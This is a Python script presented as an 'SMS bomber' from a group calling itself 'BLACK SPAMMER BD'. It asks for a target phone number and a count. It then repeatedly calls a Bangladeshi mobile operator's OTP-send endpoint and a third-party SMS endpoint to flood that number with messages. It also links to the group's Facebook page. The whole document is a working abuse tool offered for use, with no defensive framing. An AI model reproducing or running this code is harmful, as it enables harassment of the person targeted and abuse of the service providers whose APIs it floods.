# OPEN-SC
Script
#coded by Sp Shawpon
import os 
import requests
from concurrent.futures import ThreadPoolExecutor as bff 
import sys
WHITE = '\033[1;97m'
RED = '\033[1;91m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
x = '\x1b[0m'    # Def
send=0 
#----------------
def logo2():
    x = """
          {
        
           "TOOL":"SMS BOMBER",
           "OWNER":"/shawpon2"
           "VERSION":"1.0"
           "TEAM":"BLACK SPAMMER BD" 
      
          }
    """
    print(x)
def linex():
    print("-"*40)
def main():
    os.system('clear')
    logo2()
    linex()
    print(f"[A]{GREEN}>{GREEN} SP-BD SMS BOMBER-[SPEED UP]{x}")
    print(f"[B]{GREEN}>{GREEN} JOIN PUNLIC COMMIUNITY{x}")
    x2 = input(f"[=]{GREEN}> SELECT : ")
    if x2.lower() == "a":
        x3 = input(f"[=]{GREEN} > ENTER NUMBER {RED}:{GREEN} ")
        x4 = input(f"[=]{GREEN} > ENTER LIMIT {RED}:{GREEN} ")
        linex()
        if x4.isdigit():
            with bff(max_workers=120) as minhutanhu:
                try:
                    minhutanhu.submit(boom, x3, x4)
                except Exception as e:
                    print(e)
        else:
            main() 
    elif x2.lower() == "b":
        os.system('xdg-open https://facebook.com/groups/black.spammar.bd/')
        main()
    else:
        main()
def boom(nmbr, lmt):
    global send
    try:
        for i in range(int(lmt)):
            head1 = {
                'Host': 'da-api.robi.com.bd',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 9; i68 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/387.0.0.13.114;]' 'python-requests/2.31.0',
                'Accept': 'application/json',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json'
            }
            data1 = {'msisdn': nmbr}
            url1 = "https://da-api.robi.com.bd/da-nll/otp/send"
            url2 = f"https://api.teamdccs.xyz/sms.php?number={nmbr}"
            req1 = requests.post(url1, headers=head1, json=data1)
            req2 = requests.get(url2)
            if req1.status_code == 200:
                send += 1
                print(f"\r[API-1]> STATUS : [200]>[{send}]")
                linex()
            else:
                pass 
            if req2.status_code == 200:
                send += 1 
                print(f"\r[API-2]> STATUS : [200]>[{send}]")
                linex()
            else:
                 pass
    except Exception as e:
        print(e)

main()
